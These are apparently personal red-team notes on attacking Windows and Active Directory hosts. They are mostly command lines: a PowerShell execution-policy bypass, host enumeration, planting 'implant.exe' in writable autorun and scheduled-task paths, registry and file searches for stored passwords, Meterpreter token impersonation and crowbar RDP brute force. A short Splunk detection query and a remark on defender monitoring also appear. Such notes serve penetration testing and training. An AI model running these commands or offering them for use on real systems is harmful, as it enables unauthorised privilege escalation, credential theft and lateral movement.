AD NOTES

Host enumeration
#### Bypass Powershell execution policy
$env:psexecutionpolicypreference="bypass“
#### Import the script (can be from remote source)
Import-Module .\HostEnum.ps1
### #Run host enumeration checks
Invoke-HostEnum -Local

#### Basic Windows Enum Commands
>systeminfo
>whoami /all
>ipconfig /all
>net user
>netstat –ano
>tasklist /v
>sc query
>netsh firewall show config

#### Basic Detector
index=* CommandLine=* User!=*NT \ AUTHORITY* | eval length=len(CommandLine)| table length, CommandLine, ComputerName, User | sort -length
> With this in mind, execute commands only when on a priviledged session
> Try downgrading to $powershell -version 2

privilege escalation lab https://github.com/sagishahar/lpeworkshop
Check if we can modify an autorun
>(get-acl -Path "C:\Program Files\AutorunProgram\program.exe").access | ft IdentityReference,FileSystemRights,AccessControlType,IsInherited,InheritanceFlags -auto

>copy implant.exe 'C:\Program Files\AutorunProgram'
ls 'C:\Program Files\AutorunProgram'

Scheduled tasks > schtasks /query
schtasks /query /tn TASK-NAME /fo List /v
check permisions
> (get-acl -Path "C:\Missing Scheduled Binary\").access | ft IdentityReference,FileSystemRights,AccessControlType,IsInherited,InheritanceFlags -auto
> copy implant.exe "C:\Missing Scheduled Binary\" & ls "C:\Missing Scheduled Binary\"

#Search for credentials in registry:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
#Search for credentials in files:
findstr /si password *.txt
findstr /si password *.csv
findstr /si password *.xml
findstr /si password *.ini


#Lateral Mooovement
> whoami /priv

While in meterpreter
  If SeImpersonate privilege
  >use incognito
  >list_tokens -u
  >impersonate_token domain\\Administrator
      == domain\\user

### RDP BRUTEFORCE
> crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1

### Registry harvest credentials
> reg query HKLM /f password /t REG_SZ /s
#### or
> reg query HKCU /f password /t REG_SZ /s

Defenders moitoring command line execution do monitor for such. Not sure on how they
monitor masked command execution with syscall.
